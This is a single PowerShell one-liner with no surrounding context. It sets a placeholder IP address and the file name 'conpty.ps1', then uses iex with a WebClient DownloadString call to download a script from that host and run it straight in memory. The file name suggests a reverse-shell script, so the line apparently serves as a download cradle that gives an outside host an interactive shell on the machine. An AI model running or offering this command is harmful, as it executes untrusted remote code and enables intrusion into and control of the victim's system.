$i='*IP*';$f='conpty.ps1';iex(new-object net.webclient).downloadstring("http://$i/$f") 
